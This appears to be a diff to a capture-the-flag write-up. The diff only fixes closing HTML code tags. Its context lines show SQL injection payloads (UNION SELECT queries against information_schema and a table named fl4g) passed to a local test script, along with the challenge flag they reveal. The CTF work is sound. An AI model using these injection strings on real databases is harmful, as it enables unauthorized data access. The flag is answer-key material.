@@ -27,9 +27,10 @@ gave us table name: fl4g
 <pre><code>
 node test.js "100 union select 1,CONCAT(column_name,0x20) FROM information_schema.columns WHERE table_name = 'fl4g' -- "
 gave us column name: hey
-<code></pre>
+</code>
+</pre>
 
 <pre><code>
 node test.js "100 union select 1,hey from fl4g -- "
 gave us flag: flag{emScripten_is_Cut3_right?}
-<code></pre>
+</code></pre>
